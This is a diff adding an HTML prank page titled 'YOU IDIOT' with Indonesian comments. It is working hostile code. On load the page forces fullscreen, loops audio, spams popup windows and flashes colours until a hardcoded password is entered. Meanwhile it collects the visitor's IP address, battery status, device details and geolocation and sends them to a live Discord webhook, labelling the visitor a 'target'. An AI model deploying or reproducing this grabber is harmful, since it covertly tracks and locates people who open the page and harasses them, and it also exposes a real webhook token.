@@ -1,0 +1,223 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>YOU IDIOT</title>
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      font-family: monospace;
+      text-align: center;
+      font-size: 3em;
+      color: white;
+      background-color: black;
+      overflow: hidden;
+    }
+
+    #idiotText {
+      margin-top: 10%;
+      font-weight: bold;
+      animation: blink 0.5s infinite;
+    }
+
+    @keyframes blink {
+      0% { opacity: 1; }
+      50% { opacity: 0.2; }
+      100% { opacity: 1; }
+    }
+
+    #passwordContainer {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      background: rgba(0,0,0,0.8);
+      padding: 20px;
+      border: 2px solid red;
+      border-radius: 10px;
+      font-size: 20px;
+      z-index: 9999;
+    }
+
+    input {
+      padding: 10px;
+      font-size: 16px;
+      width: 200px;
+    }
+
+    button {
+      padding: 10px;
+      font-size: 16px;
+      background: red;
+      color: white;
+      border: none;
+      margin-left: 10px;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+  <div id="idiotText">💀 YOU IDIOT 💀</div>
+
+  <div id="passwordContainer">
+    <p>MASUKKAN PASSWORD UNTUK MENGHENTIKAN</p>
+    <input type="password" id="passInput" placeholder="Password...">
+    <button onclick="checkPassword()">SUBMIT</button>
+  </div>
+
+  <script>
+    const webhook = "https://discord.com/api/webhooks/1381323318015168713/n7-0frn24IaSz4BXK3nD6TnLTYKzNq8iZxq8RWkUDmEF0P35Dz_9o_ALgjDQkyFx78h9"; // Ganti dengan webhook kamu
+    const password = "HAZELGANTENG"; // Ganti passwordnya di sini
+
+    let audio;
+    let bgInterval;
+    let popupTimer;
+
+    // Dapetin info IP
+    async function getIP() {
+      try {
+        const res = await fetch("https://api.ipify.org?format=json");
+        const data = await res.json();
+        return data.ip;
+      } catch {
+        return "Gagal ambil IP";
+      }
+    }
+
+    // Info baterai
+    async function getBattery() {
+      try {
+        const battery = await navigator.getBattery();
+        return {
+          level: (battery.level * 100) + "%",
+          charging: battery.charging ? "Ya" : "Tidak"
+        };
+      } catch {
+        return { level: "Tidak Didukung", charging: "?" };
+      }
+    }
+
+    // Info device
+    function getDeviceInfo() {
+      return {
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        language: navigator.language,
+        online: navigator.onLine ? "Online" : "Offline"
+      };
+    }
+
+    // Lokasi
+    function getLocation() {
+      return new Promise((resolve) => {
+        if (!navigator.geolocation) {
+          return resolve({ latitude: "N/A", longitude: "N/A" });
+        }
+
+        navigator.geolocation.getCurrentPosition(
+          pos => resolve({
+            latitude: pos.coords.latitude,
+            longitude: pos.coords.longitude
+          }),
+          () => resolve({ latitude: "Ditolak", longitude: "Ditolak" }),
+          { timeout: 5000 }
+        );
+      });
+    }
+
+    // Kirim ke webhook
+    async function sendToWebhook(data) {
+      const payload = {
+        content: "**📡 Target Info Terdeteksi!**",
+        embeds: [{
+          title: "🧠 Informasi Target",
+          color: 16711680,
+          fields: [
+            { name: "🌐 IP", value: data.ip, inline: true },
+            { name: "🔋 Baterai", value: `${data.battery.level} (${data.battery.charging})`, inline: true },
+            { name: "📱 Platform", value: data.device.platform, inline: true },
+            { name: "🧭 Browser", value: data.device.userAgent, inline: false },
+            { name: "📡 Online", value: data.device.online, inline: true },
+            { name: "🌎 Lokasi", value: `Lat: ${data.loc.latitude}, Lon: ${data.loc.longitude}`, inline: false }
+          ],
+          footer: { text: "by Hazel | Cyaa OSINT" },
+          timestamp: new Date().toISOString()
+        }]
+      };
+
+      await fetch(webhook, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(payload)
+      });
+    }
+
+    // Fullscreen
+    function goFullScreen() {
+      const el = document.documentElement;
+      if (el.requestFullscreen) el.requestFullscreen();
+      else if (el.mozRequestFullScreen) el.mozRequestFullScreen();
+      else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
+      else if (el.msRequestFullscreen) el.msRequestFullscreen();
+    }
+
+    // Musik YOU IDIOT
+    function playMusic() {
+      audio = new Audio("https://www.myinstants.com/media/sounds/you-idiot.mp3");
+      audio.loop = true;
+      audio.volume = 1;
+      audio.play().catch(() => {});
+    }
+
+    // Popup windows
+    function spamWindows() {
+      popupTimer = setInterval(() => {
+        for (let i = 0; i < 5; i++) {
+          window.open("https://example.com", "_blank", "width=200,height=200");
+        }
+      }, 3000);
+    }
+
+    // Warna background berubah
+    function changeBgColor() {
+      const colors = ["black", "red", "blue", "purple", "yellow"];
+      let i = 0;
+      bgInterval = setInterval(() => {
+        document.body.style.backgroundColor = colors[i % colors.length];
+        i++;
+      }, 1000);
+    }
+
+    // Hentikan semua efek
+    function stopAll() {
+      if (audio) audio.pause();
+      clearInterval(bgInterval);
+      clearInterval(popupTimer);
+      document.getElementById("idiotText").innerText = "🛑 SYSTEM STOPPED";
+      document.getElementById("passwordContainer").remove();
+    }
+
+    // Cek password
+    function checkPassword() {
+      const input = document.getElementById("passInput").value;
+      if (input === password) {
+        stopAll();
+      }
+    }
+
+    // Eksekusi semua
+    (async () => {
+      goFullScreen();
+      playMusic();
+      spamWindows();
+      changeBgColor();
+
+      const ip = await getIP();
+      const battery = await getBattery();
+      const device = getDeviceInfo();
+      const loc = await getLocation();
+      await sendToWebhook({ ip, battery, device, loc });
+    })();
+  </script>
+</body>
+</html>
